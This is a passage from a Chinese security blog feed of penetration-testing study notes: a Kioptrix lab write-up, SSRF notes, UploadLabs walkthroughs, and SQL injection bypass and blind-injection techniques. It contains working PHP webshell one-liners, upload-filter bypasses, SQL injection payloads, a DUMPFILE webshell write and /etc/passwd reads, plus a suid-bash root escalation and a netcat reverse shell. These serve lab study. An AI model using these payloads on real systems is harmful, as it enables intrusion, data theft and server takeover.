alt="image-20210706092613364"></p><p>这里发现当用户在web页面登陆成功后，会将用户名和密码写到fd9，应该是php的session。</p><p>前面发现密码字段是注入点，所以这里可以构造万能密码登陆，后面再接上一句话木马。</p><p>先试一下phpinfo</p><p>密码字段填<code>&#39;or+1=1--+&lt;?php+phpinfo();?&gt;</code></p><p><img src="/posts/31832/26.png" alt="image-20210706093730833"></p><p>访问fd9</p><p><img src="/posts/31832/27.png" alt="image-20210706093845003"></p><p>发现phpinfo执行成功</p><p><img src="/posts/31832/28.png" alt="image-20210706103531226"></p><p>写一个一句话</p><p>再次访问，发现还是phpinfo。</p><p>经过多次实验，发现在登陆时去掉Cookie,响应会报错，并Set-Cookie这个cookie与之前的不同。把这个cookie写到请求的Cookie请求头再去登陆。请求fd时也带有这个cookie。</p><p>发现改变cookie的值，fd中的内容也不同。应该是对于每一个session都起了一个进程。</p><p><img src="/posts/31832/29.png" alt="image-20210706110338889"></p><p>这时已经可以以www-data的身份执行命令。</p><p>前面已经使用mysql UDF chmod u+s /bin/bash来获得root权限。</p><p>这里我们安置一个后门，并用root权限运行。</p><p>搜一下whereis netcat（看了攻略才知道的，竟然自带netcat）</p><p><img src="/posts/31832/30.png" alt="image-20210706113431526"></p><p>先用nc传个shell回来，然后把CrossC2生成的C2传过去。</p><p>用MySQL的UDFsys_exec()执行木马。</p><p>拿到shell后看了member.php的内容</p><p>发现allow_url_fopen和allow_url_include都是On</p><p><img src="/posts/31832/31.png" alt="image-20210706095750981"></p><p>之所以不可以远程文件包含是因为使用了file_exists（），只有本地路径存在才可以执行到include()。</p><h4 id="获得新思路-1"><a href="#获得新思路-1" class="headerlink" title="获得新思路"></a>获得新思路</h4><p>查看/proc/self/fd/xxx看看有没有什么有趣的东西</p><p>查看/proc/self/cmdline查看运行符文的命令行</p><h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><ul><li><a href="https://www.cnblogs.com/starrys/p/14671225.html" target="_blank" rel="noopener">沉云-文件包含拿shell</a></li><li><a href="https://blog.g0tmi1k.com/2012/02/kioptrix-level-4-local-file/" target="_blank" rel="noopener">Kioptrix - Level 4 (Local File Inclusion)</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ssrf漏洞学习笔记</title>
      <link href="/posts/19385.html"/>
      <url>/posts/19385.html</url>
      
        <content type="html"><![CDATA[<h4 id="常见触发点"><a href="#常见触发点" class="headerlink" title="常见触发点"></a>常见触发点</h4><ul><li><p>web</p><ul><li>常见功能<ul><li>图片加载<ul><li>头像</li><li>以图搜图</li><li>图片变化</li><li>Markdown显示图片</li></ul></li><li>下载服务<ul><li>百度云离线下载</li></ul></li><li>预览内容<ul><li>分享网站</li><li>收藏</li><li>网址预览</li></ul></li><li>代理服务</li><li>文件包含<ul><li>远程文件包含<ul><li>file_get_contents($file)</li><li>开启allow_url_open</li></ul></li></ul></li><li>多媒体加载</li><li>api demo</li><li>站长工具</li><li>在线编程</li><li>应用、中间件自带实例文件</li><li>RSS</li></ul></li></ul><a id="more"></a><ul><li>url中的参数名,利用谷歌搜索，找相关漏洞。或加入fuzz字典<ul><li>share</li><li>wap</li><li>url</li><li>link</li><li>src</li><li>source</li><li>target</li><li>u</li><li>3g</li><li>display</li><li>sourceURL</li><li>imageURL</li><li>domain</li></ul></li></ul></li><li><p>格式处理</p></li><li><p>数据库</p></li><li><p>广义SSRF</p></li></ul><h4 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h4><ul><li>排除法</li></ul><h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><ul><li>限制点<ul><li>输入合法性验证</li><li>输出结果校验<ul><li>响应格式校验</li></ul></li><li>网络限制<ul><li>防火墙</li></ul></li></ul></li><li>限制类型<ul><li>后缀限制</li><li>正则</li><li>协议</li><li>hostname</li><li>黑名单</li><li>域名</li><li>端口硬编码</li></ul></li></ul><h3 id="绕过"><a href="#绕过" class="headerlink" title="绕过"></a>绕过</h3><ul><li><p>使用其它协议</p><ul><li>file://</li><li>gopher://</li></ul></li><li><p><a href="http://www.baidu.com@10.10.10.10" target="_blank" rel="noopener">http://www.baidu.com@10.10.10.10</a></p></li><li><p>整数型：115.239.210.26 = 16373751032</p></li><li><p>十六进制型：127.0.0.1 = 0x7F000001</p></li><li><p>$f=fscokopen($host,80)</p><ul><li>host=127.0.0.1:11211</li></ul></li></ul><h4 id="利用流程"><a href="#利用流程" class="headerlink" title="利用流程"></a>利用流程</h4><ul><li>扫描内网 fuzz ip/port</li><li>找敏感信息 例如敏感端口：redis 6379</li></ul><h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>操作了1下ssrf打redis，这个算比较经典的利用之一。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>靶场学习笔记之UploadLabs</title>
      <link href="/posts/1d8a7fa0.html"/>
      <url>/posts/1d8a7fa0.html</url>
      
        <content type="html"><![CDATA[<p>本篇对文件上传的学习做了记录。</p><a id="more"></a><h3 id="UploadLabs"><a href="#UploadLabs" class="headerlink" title="UploadLabs"></a>UploadLabs</h3><h4 id="Pass1"><a href="#Pass1" class="headerlink" title="Pass1"></a>Pass1</h4><p>这关使用文件后缀白名单的方式，在前端检测了文件类型。</p><p>直接用burp修改请求绕过就行。</p><p>其间WindowsDefender报毒file: C:\Windows\php7CC0.tmp,经过搜索发现这个是php上传文件的缓存。加入wd的排除项就可以了。</p><h4 id="Pass2"><a href="#Pass2" class="headerlink" title="Pass2"></a>Pass2</h4><p>这关是在后端进行了检查，使用的Content-Type白名单，包括image/jpeg,image/png,image/gif</p><p>绕过方式同Less1</p><h4 id="Pass3"><a href="#Pass3" class="headerlink" title="Pass3"></a>Pass3</h4><p>在后端做了黑名单检查。提示不允许上传asp,jsp,php后缀的文件。</p><p>经过搜索发现可以传phtml,phm,phs,ph5等。不过这些后缀需要在对应的web服务器中进行配置才能用php解析。在网上搜到的博客基本都是说</p><blockquote><p>需要在apache/conf/httpd.conf配置文件中有:</p><p>AddType application/x-httpd-php .php .phtml .phps .php5 .pht</p></blockquote><p>但是经过测试发现并没有用。恶补了一下apache和php相关的知识，发现这种方式只在php是module运行模式下起作用（upload-labs官方说明了环境搭建时使用module方式连接，当时没有注意）。而我用的是phpstudy，默认使用的fastcgi模式，所以并不起作用。</p><p>如果想在fcgi模式下用php解析特定后缀，需要修改fcgi解析后缀，但是不建议这么修改。建议使用伪静态的方式把来自不同后缀的请求定位到php文件。</p><h4 id="Pass4"><a href="#Pass4" class="headerlink" title="Pass4"></a>Pass4</h4><p>黑名单了phtml,phm,等。但是可以使用.htaccess</p><h4 id="Pass5"><a href="#Pass5" class="headerlink" title="Pass5"></a>Pass5</h4><p>上传.user.ini</p><p>其中写auto_prepend_file=01.gif，其它所有php都会预加载01.gif</p><p>然后再上传名为01.gif的一句话木马</p><p>只要是以fastcgi运行的php都可以用这个方法</p><h4 id="Pass6"><a href="#Pass6" class="headerlink" title="Pass6"></a>Pass6</h4><p>大小写绕过</p><h4 id="Pass7"><a href="#Pass7" class="headerlink" title="Pass7"></a>Pass7</h4><p>加空格绕过</p><h4 id="Pass8"><a href="#Pass8" class="headerlink" title="Pass8"></a>Pass8</h4><p>加.绕过</p><p>windows会自动删除最后一个点</p><h4 id="Pass9"><a href="#Pass9" class="headerlink" title="Pass9"></a>Pass9</h4><p>::$data绕过</p><h4 id="Pass10"><a href="#Pass10" class="headerlink" title="Pass10"></a>Pass10</h4><p>. .绕过</p><p>代码规则是：</p><ol><li>首位去空</li><li>末尾删点</li><li>取第一个点后的字符串</li><li>转为小写</li><li>删去::$DATA</li><li>首尾去空</li></ol><p>php. .</p><h4 id="Pass11"><a href="#Pass11" class="headerlink" title="Pass11"></a>Pass11</h4><p>把特定后缀替换为空，直接双写绕过</p><h4 id="Pass12"><a href="#Pass12" class="headerlink" title="Pass12"></a>Pass12</h4><p>因为这关传输了文件的保存路径，在路径里面增加%00进行截断字符串。文件名就没意义了。</p><h4 id="Pass13"><a href="#Pass13" class="headerlink" title="Pass13"></a>Pass13</h4><p>还是00截断，GET方式变为POST方式</p><p>POST不会像GET对%00进行自动解码<br>需要用burp在二进制中进行修改</p><p>将70 68 70后面的2b改为00</p><h4 id="Pass14"><a href="#Pass14" class="headerlink" title="Pass14"></a>Pass14</h4><p>只读前两字节判断文件是否合法</p><p>制作图片马：</p><ul><li>cmd<code>copy 1.jpg/b 1.php/a 2.jpg</code>,把1.jpg（二进制）和2.php（ASCII）先后写入2.jpg</li><li>powershell<code>echo &lt;?php echo(exec($_GET[&#39;cmd&#39;]));?&gt;|out-file -append -encoding ascii 1.jpg</code>，直接追加ASCII格式的内容到1.jpg</li><li>直接上传，文件包含执行。</li></ul><h4 id="Pass15"><a href="#Pass15" class="headerlink" title="Pass15"></a>Pass15</h4><p>getimagesize获取文件信息，判断是否是jpeg png gif</p><h4 id="Pass16"><a href="#Pass16" class="headerlink" title="Pass16"></a>Pass16</h4><p>exif_imagetype模块检测，同样是检测前两个字节</p><h4 id="Pass17"><a href="#Pass17" class="headerlink" title="Pass17"></a>Pass17</h4><p>图片被二次渲染</p><h5 id="gif"><a href="#gif" class="headerlink" title="gif"></a>gif</h5><p>将渲染后的图片下载，用winhex和原图片对比。直接修改二进制，将payload添加在原图片没有变的位置。</p><h5 id="png"><a href="#png" class="headerlink" title="png"></a>png</h5><p><a href="https://xz.aliyun.com/t/2657" target="_blank" rel="noopener">参见这里</a></p><h4 id="Pass18"><a href="#Pass18" class="headerlink" title="Pass18"></a>Pass18</h4><p>代码逻辑有问题，先把文件上传，再判断文件是否合法。不合法删除，合法重命名。</p><p>直接用burp intruder，在文件被删前访问。</p><figure class="hljs highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">&lt;?php fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[&#39;ant&#39;]); ?&gt;&#39;);?&gt;<br></code></pre></td></tr></table></figure><p>burp上传抓包，然后用nullpayload</p><p>写python脚本，一直访问，直到html.status_code==200</p><h4 id="Pass19-条件竞争"><a href="#Pass19-条件竞争" class="headerlink" title="Pass19 条件竞争"></a>Pass19 条件竞争</h4><p>同样是代码逻辑问题，先把文件上传，再判断是否需要处理。</p><p>用burp intruder上传图片马，写python在被(重命名+重新渲染+移动)之前用文件包含访问。</p><p>这道题的文件上传路径是根目录下，upload1.png。看起来是路径中少了一个斜杠。</p><p>应该是作者代码出现了错误，看了下代码，找到了问题= =。修复后在github提了个pull request。</p><h4 id="Pass20"><a href="#Pass20" class="headerlink" title="Pass20"></a>Pass20</h4><p>在文件名后面加<code>/.</code>绕过</p><p>点绕过 空格绕过</p><p>apache解析漏洞 a.php.adsfg</p><h4 id="Pass21"><a href="#Pass21" class="headerlink" title="Pass21"></a>Pass21</h4><p>看代码，发现步骤是这样的</p><ol><li>检查了Content-Type和POST 参数中的save_name。</li><li>如果save_name不是数组，则用<code>.</code>explode成数组</li><li>先检查end(save_name)是否是 jpg png gif</li><li>然后save_name=reset(save_name).’.’.save_name(count(svae_name)-1)，也就是如果save_name是a.b.c.d,就重命名成a.d</li></ol><p>最关键的一点是，它判断了save_name是不是数组，如果正常上传肯定不是，所以会用<code>.</code>来分割成数组，然后再进行后面的判断。</p><p>那我们直接用burp，传个save_name的数组</p><p>save_name[0]=’a.php’</p><p>save_name[2]=’jpg’</p><p>这里是利用了php的特性，在这种情况下count(save_name)=2</p><p>那么count(save_name)-1=1，但savename[1]为空，所以第四步拼接完成后结果是a.php</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>了解了文件上传思路，图片马和文件包含的结合利用方式，各种绕过方法。之后需要熟悉下各种解析漏洞。</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
          <category> 专项靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入（三）Bypass技巧</title>
      <link href="/posts/a696f999.html"/>
      <url>/posts/a696f999.html</url>
      
        <content type="html"><![CDATA[<p>Bypass方式的汇总</p><a id="more"></a><h4 id="一些数据库特性"><a href="#一些数据库特性" class="headerlink" title="一些数据库特性"></a>一些数据库特性</h4><h5 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h5><ul><li>#</li></ul><hr><ul><li>– - </li><li>–+</li><li>//</li><li>/**/</li><li>/*letmetest*/</li><li>;%00</li></ul><h5 id="空格"><a href="#空格" class="headerlink" title="空格"></a>空格</h5><ul><li>MySQL中可以替代空格的字符：<ul><li>/**/</li><li>()</li><li>+</li><li>%20</li><li>%09</li><li>%0a</li><li>0x0a</li><li>0x0b</li><li>0x0c</li><li>0x0d</li><li>+</li><li>-</li><li>~</li><li>.</li></ul></li></ul><p><strong>MySQL特性</strong></p><ul><li><p>MySQL中=为等于，只有在update中是赋值</p></li><li><p><code>：=</code> //赋值</p></li><li><p>@    //加变量名可以直接调用</p></li><li><p>内联注释： /*!50001*/表示数据库版本&gt;=5.00.01时中间的语句才能被执行</p></li></ul><h4 id="Bypass"><a href="#Bypass" class="headerlink" title="Bypass"></a>Bypass</h4><ul><li><p>参数污染绕过</p><ul><li>id=33/<em>id=-33 union select 1,2,3,4,xxxxxx from information_schema xxxx%23\</em>/</li></ul></li><li><p>使用<strong>动态字符串拼接</strong>或<strong>十六进制</strong>，可以避免使用单引号<code>&#39;</code></p><ul><li>select ename,sal from emp where ename = ‘marcus’<ul><li>Oracle: select ename,sal from emp where ename=chr(109)||chr(97)||chr(114)||chr(99)||chr(117)||chr(115)</li><li>MySQL: select ename,sal from emp where ename=char(109)||char(97)||char(114)||char(99)||char(117)||char(115)</li></ul></li><li>select ename,sal from emp where ename=0x6d6172637573</li></ul></li><li><p>设计好注入的数据，可以避开使用注释号 <code>--</code></p><ul><li>‘or 1=1– <ul><li>‘or ‘a’=’a</li></ul></li></ul></li><li><p>通过注释绕开空格</p><ul><li>select/*foo<em>/username,password/*foo</em>/from/*foo/users</li><li>MySQL中，注释可以插入到关键字中<ul><li>sel/*foo/ect username,password fr/*foo/om users</li></ul></li><li>空格：%09 TAB键（水平）、%0a 新建一行、%0c 新的一页、%0d return功能、%0b TAB键（垂直）、%a0 空格</li></ul></li><li><p>绕过等号</p><ul><li>like和等号执行效果一致</li><li>使用&lt;&gt;绕过<ul><li>&lt;&gt;等价于!=，所以在&lt;&gt;前加个！就是等于，比如 where !(id&lt;&gt;2)</li></ul></li><li>rlike</li><li>regexp</li></ul></li><li><p>宽字节注入绕过转义符</p><ul><li>GBK和BIG5适用</li><li>%df’</li></ul></li><li><p>等价字符以及等价函数</p><ul><li>and=&amp;&amp;</li><li>or=||</li><li>xor=^</li><li>not =!</li><li>hex()、bin()=ascii()</li><li>concat_ws=group_concat()</li><li>sleep()=benchmark()</li><li>mid()=、substr()=substring()</li><li>@@user=user()</li><li>@@datadir=datadir()</li></ul></li><li><p>关键字拆分</p><ul><li>se’+’le’+’ct’</li><li>%S%E%L%E%C%T 1     //ASP环境</li><li>u/**/nio/**/n/**se/**/lect</li></ul></li><li><p>mysql中不必要使用分号，只要语法正确，解释器就会正确执行</p></li><li><p>select</p><ul><li>SeLeCt(大小写)</li><li>%00select(增加空字节)</li><li>selsecectect(双写)</li><li>%53%45%4c%45%43%53(url编码)</li><li>%2553%2545%254c%2545%2543%2553（多次url编码）</li></ul></li><li><p>Hex编码、URL编码、宽字节、Unicode编码（IIS）支持</p><ul><li>union<ul><li>un%u0069on</li></ul></li></ul></li></ul><h4 id="三、利用过滤逻辑缺陷"><a href="#三、利用过滤逻辑缺陷" class="headerlink" title="三、利用过滤逻辑缺陷"></a>三、利用过滤逻辑缺陷</h4><ul><li>白盒审计</li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li><p>pangolin windows上的sql注入集成工具</p></li><li><p>HexorBase</p></li><li><p>一个整理的比较好的博客<a href="https://www.cnblogs.com/Vinson404/p/7253255.html" target="_blank" rel="noopener">https://www.cnblogs.com/Vinson404/p/7253255.html</a></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入（二）SQL注入进阶-报错注入、盲注</title>
      <link href="/posts/d35cebb1.html"/>
      <url>/posts/d35cebb1.html</url>
      
        <content type="html"><![CDATA[<p>上一篇是SQL语句执行结果有回显的情况，本篇为无回显的情况下的一些利用技巧。</p><a id="more"></a><p>在SQL语句执行结果不回显的情况下，有三种情况：</p><ol><li><p>数据库会回显详细报错信息，使用报错注入。</p></li><li><p>数据库只回显通用报错信息，使用基于数据库错误的盲注。</p></li><li><p>数据库不回显任何信息，使用基于时间的盲注。</p></li></ol><h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><ul><li>如果数据库报错会回显到前端，可以通过触发报错来获取到需要的数据。</li></ul><h5 id="双查询注入"><a href="#双查询注入" class="headerlink" title="双查询注入"></a>双查询注入</h5><figure class="hljs highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql&gt; select count(*),concat(floor(rand()*2),':',database()) as a from information_schema.tables group by a;<br>ERROR 1062 (23000): Duplicate entry '0:security' for key '&lt;group_key&gt;'<br></code></pre></td></tr></table></figure><ul><li>50%的触发概率</li></ul><h5 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h5><figure class="hljs highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql&gt; select extractvalue('a',concat('~',database()));<br>ERROR 1105 (HY000): XPATH syntax error: '~security'<br></code></pre></td></tr></table></figure><ul><li>extractvalue()查询得到字符串的最大长度为32，如果长度超过32，用substring()函数截取。</li></ul><h5 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h5><ul><li>与extractvalue类似 </li></ul><h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><h5 id="基于逻辑真假不同结果来获取信息"><a href="#基于逻辑真假不同结果来获取信息" class="headerlink" title="基于逻辑真假不同结果来获取信息"></a>基于逻辑真假不同结果来获取信息</h5><ul><li>1‘ and 1=1 – </li><li>1’ and 1=2 – </li><li>1’ and ORD(MID(VERSION(),2,1))&amp;32&gt;0<ul><li>VERSION的第二位的ASCII码的二进制第3位&gt;0</li><li>ORD()函数返回字符串第一个字符的ASCII值</li><li>MID函数类似于mssql和oracle中的substr</li></ul></li><li>1‘ and ascii(version(),1,1))=65 –<ul><li>VERSION的第一位的ascii码为65</li></ul></li><li>current_user()、database()</li></ul><h5 id="基于数据库错误获取信息"><a href="#基于数据库错误获取信息" class="headerlink" title="基于数据库错误获取信息"></a>基于数据库错误获取信息</h5><ul><li>select 1/0 from dual where(select username from all_users where username=’dbsnmp’)=’dbsnmp’<ul><li>如果用户dbsnmp存在，则会计算1/0，数据库会发生错误</li></ul></li><li>select 1 where &lt;&lt;condition&gt;&gt; or 1/0 =0</li><li>select ename,job form emp where deptno=? order by? desc<ul><li>select ename,job from emp where deptno=? order by (select 1/0 from dual where (select substr(max(object_name),1,1) from user_objects)=’Y’) desc</li></ul></li></ul><h5 id="outfile"><a href="#outfile" class="headerlink" title="outfile"></a>outfile</h5><ul><li><p>如果不回显报错，也不回显数据，但知道页面的绝对路径，可以使用。</p></li><li><p>！注意</p><ul><li>需要数据库的用户具有选定目录的写入权限</li><li>mysql配置文件my.ini中加入一行<code>secure-file-priv=&quot;&quot;</code><ul><li>用来限制load data,select … into outfile, load_file()穿到哪个指定目录。</li><li>当secure_file_priv的值为null ，表示限制mysqld 不允许导入|导出</li><li>当secure_file_priv的值为/tmp/ ，表示限制mysqld 的导入|导出只能发生在/tmp/目录下</li><li>当secure_file_priv的值没有具体值时，表示不对mysqld 的导入|导出做限制</li></ul></li></ul></li><li><p>select xxx into outfile ‘文件路径’，放在web服务器下，可以通过web访问。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入（一）SQL注入的利用思路</title>
      <link href="/posts/5cd68c09.html"/>
      <url>/posts/5cd68c09.html</url>
      
        <content type="html"><![CDATA[<p>从检测到拖库的基本流程</p><a id="more"></a><h4 id="一、检测是否存在注入"><a href="#一、检测是否存在注入" class="headerlink" title="一、检测是否存在注入"></a>一、检测是否存在注入</h4><ul><li>基于报错的检测方法<ul><li>’    ”    %    （）</li></ul></li><li>基于布尔的检测<ul><li>1‘ and ‘1’=’1    /    1’ and ‘1</li><li>1’ and ‘1’=2    /    1’ and ‘0</li></ul></li></ul><h4 id="二、查明查询返回的列数"><a href="#二、查明查询返回的列数" class="headerlink" title="二、查明查询返回的列数"></a>二、查明查询返回的列数</h4><p><em>注意：–后必须加一个空格，否则注释不生效</em></p><ul><li>方法1，查询得到执行，说明该列存在，试出最大列数：<ul><li>‘ order by 20 – </li><li>‘ order by 10 – </li><li>‘ order by 5 – </li></ul></li><li>方法2，查询得到执行，说明使用了正确的列数：<ul><li>‘ union select null – </li><li>‘ union select null, null – </li><li>‘ union select null, null, null – </li></ul></li><li>方法3<ul><li>‘ union select 1,2,3,4 – 观察前端返回的是查询到的第几个字段</li></ul></li></ul><h4 id="三、找到一个使用字符串数据类型的列"><a href="#三、找到一个使用字符串数据类型的列" class="headerlink" title="三、找到一个使用字符串数据类型的列"></a>三、找到一个使用字符串数据类型的列</h4><ul><li>注入以下语句，如果查询得到执行，将看到另一行包含a的数据<ul><li>‘ union select ‘a’, null, null –</li><li>‘ union select null, ‘a’, null –</li><li>‘ union select null, null, ‘a’ –</li></ul></li><li>此时可以，把字符串的字段改为数据库的函数<ul><li>‘ union all select database()，null,null –</li><li>‘ union select @@version,null,null –    (Mysql)    </li><li>‘ union select banner,null,null from v$version–    (Oracle)</li></ul></li></ul><!--more--><h4 id="四、获取有用的数据"><a href="#四、获取有用的数据" class="headerlink" title="四、获取有用的数据"></a>四、获取有用的数据</h4><ul><li>一些常用的函数：<ul><li>’ union select database() ,substring_index(USER(),”@”,1)– <ul><li>把USER()执行的结果用@切分，显示第一段</li></ul></li><li>DB用户：user()</li><li>DB版本：version()</li><li>全局函数：@@datadir、@@hostname、@@VERSION、@@version_compile_os</li><li>当前库：database()</li><li>ASCII转字符：char()</li><li>CONCAT_WS(CHAR(32,58,32),user(),database(),version())</li><li>MD5(‘b’)</li></ul></li></ul><h4 id="五、拖库"><a href="#五、拖库" class="headerlink" title="五、拖库"></a>五、拖库</h4><h5 id="有权限读取information-schema库"><a href="#有权限读取information-schema库" class="headerlink" title="有权限读取information_schema库"></a>有权限读取information_schema库</h5><ul><li>MySQL数据查询（元数据的表 information_schema）<ul><li>查询有那些库<ul><li>select schema_name from information_schema.schemata;</li><li>select distinct table_schema from information_schema.tables;</li></ul></li><li>查询有哪些表<ul><li>select table_name from information_schema.tables;</li><li>select count(*),table_schema from information_schema.tables group by table_schema //看看每个库各有几张表<ul><li>其中information_schema很有价值，必须要学。</li></ul></li></ul></li><li>查询库中的表名<ul><li>select  table_schema from information_schema.tables where table_schema= ‘dvwa’</li></ul></li><li>查询表中的列名<ul><li>select table_name,column_name from information_schema.columns where table_schema = ‘dvwa’ and table_name=’users’</li></ul></li><li>查询表中数据</li></ul></li></ul><h5 id="无权读取information-schema库-拒绝union、order-by语句"><a href="#无权读取information-schema库-拒绝union、order-by语句" class="headerlink" title="无权读取information_schema库 / 拒绝union、order by语句"></a>无权读取information_schema库 / 拒绝union、order by语句</h5><ul><li><p>第一步、猜列名：<code>&#39; and asd is null --</code></p><ul><li>可以通过返回信息得到 asd这个列是否存在，提前准备好字典。用burp Intruder</li><li><code>find / -name *.column*.txt</code><ul><li>去除以#开头的行<code>cat xxx.txt | grep -v ^# &gt; column.txt</code></li></ul></li></ul></li><li><p>通过列名猜当前表名：<code>&#39; and table.user is null --</code></p><ul><li><code>find / -name *.table.txt</code><ul><li>同样需要去除#开头的行</li></ul></li></ul></li><li><p>猜库名：<code>&#39; and db.table.user is null --</code></p></li><li><p>猜库中的其他表：<code>&#39; and (select count(*) from table)&gt;0 --</code></p></li><li><p>猜表对应关系：<code>&#39; and user.user is null --</code></p></li><li><p>猜字段内容：<code>or user=&#39;admin</code>,<code>or user like &#39;%a%&#39;</code></p></li><li><p>账号对应密码：<code>&#39; or user = &#39;admin&#39; and password = &#39;md5hash&#39;</code></p><ul><li>用md5sum命令把密码字典生成MD5字典，然后intruder</li></ul></li><li><p>可以插入账号密码数据条目<code>&#39;; insert xxxxxx</code>,<code>&#39;;update users set user=&#39;aaa&#39; where user=&#39;bbb&#39;</code></p></li></ul><h4 id="六、其它利用场景"><a href="#六、其它利用场景" class="headerlink" title="六、其它利用场景"></a>六、其它利用场景</h4><ul><li>读取文件<ul><li>select load_file(‘/etc/passwd’)</li></ul></li><li>写入文件<ul><li>select “&lt;?php passthru($_GET[‘cmd’]); ?&gt;” INTO DUMPFILE “/var/www/a.php”<ul><li>DUMPFILE后不加路径的话，默认位置在/var/lib/mysql/dvwa/a.php</li><li>语句中的符号可能会被过滤，可以尝试使用编码绕过，url编码，16进制编码。INTO DUMPFILE 函数会解码。<ul><li><code>cat reverse-shell.php|xxd -ps|tr -d &#39;\n&#39;</code><ul><li>xxd -ps 生成的二进制文件中会有换行符，需要用tr来去掉</li></ul></li><li>select (0x1111111111111) into dumpfile “/tmp/c.php”</li></ul></li></ul></li><li>写入到/tmp文件夹（777权限），然后include到页面中，include成为当前页面的一部分，而当前页面是有执行权限的</li></ul></li><li>保存下载数据库<ul><li>select select (0x1111111111111) into outfile “/tmp/a.db”</li></ul></li></ul><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ol><li>判断是否存在</li><li>查明列数</li><li>找到string类型位置</li><li>查询，利用</li></ol><p>权限最小化，权限分离</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> KaliLinux渗透测试学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机取证</title>
      <link href="/posts/af5f2fef.html"/>
      <url>/posts/af5f2fef.html</url>
      
        <content type="html"><![CDATA[<h4 id="取证科学"><a href="#取证科学" class="headerlink" title="取证科学"></a>取证科学</h4><ul><li>Forensic<ul><li>法医的、用于法庭的、辩论学、法医学</li><li>为了侦破案件还原事实真相，收集法庭证据的一系列科学方法</li></ul></li><li>CSI：物理取证<ul><li>指纹、DNA、弹道、血迹</li><li>物理取证的理论基础是物质交换原则</li></ul></li><li>关注：数字取证/计算机取证/电子取证<ul><li>智能设备、计算机、手机平板、IoT、有线及无线通信、数据存数</li></ul></li></ul><a id="more"></a><h4 id="通用原则"><a href="#通用原则" class="headerlink" title="通用原则"></a>通用原则</h4><ul><li>维护证据完整性<ul><li>数字取证相比物理取证，可以有无限数量的拷贝进行分析。</li><li>数字hash值验证数据完整性</li></ul></li><li>维护监管链<ul><li>物理证物保存在证物袋中，每次取出使用严格记录，避免污染破坏</li><li>数字证物原始版写保护，使用拷贝进行分析</li></ul></li><li>标准的操作步骤<ul><li>证物使用严格按照规范流程，即使事后证明流程有误（免责）</li></ul></li><li>取证分析全部过程记录文档</li></ul><h4 id="数字取证者的座右铭"><a href="#数字取证者的座右铭" class="headerlink" title="数字取证者的座右铭"></a>数字取证者的座右铭</h4><ul><li>不要破坏数据现场（看似简单、几乎无法实现）</li><li>寄存器、CPU缓存、I/O设备缓存等易失性数据几乎无法获取</li><li>系统内存是主要的非易失性存储介质取证对象，不修改无法获取其中数据</li><li>非易失性存储介质通常使用完整镜像拷贝保存</li></ul><h4 id="证据搜索"><a href="#证据搜索" class="headerlink" title="证据搜索"></a>证据搜索</h4><ul><li>数据</li><li>信息</li><li>证据</li></ul><h4 id="作为安全从业者"><a href="#作为安全从业者" class="headerlink" title="作为安全从业者"></a>作为安全从业者</h4><ul><li>通过取证还原黑客入侵轨迹</li><li>作为渗透测试和黑客攻击区分标准</li></ul><h4 id="活取证"><a href="#活取证" class="headerlink" title="活取证"></a>活取证</h4><ul><li>抓取文件metadata、创建时间线、命令历史、分析日志文件、哈希摘要、转存内存信息</li><li>使用未受感染的干净程序执行取证</li><li>U盘、网络 存储手机到的数据</li></ul><h4 id="死取证"><a href="#死取证" class="headerlink" title="死取证"></a>死取证</h4><ul><li>关机后制作硬盘镜像、分析镜像（MBR、GPT、LVM）</li></ul><h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><ul><li>内存dump工具<ul><li>Dumpit：<a href="http://www.moonsols.com/wp-content/uploads/downloads/2017/07/Dumplt.zip" target="_blank" rel="noopener">http://www.moonsols.com/wp-content/uploads/downloads/2017/07/Dumplt.zip</a></li><li>内存文件与内存大小接近或者稍微大一点，raw格式</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
          <category> 渗透测试 </category>
          
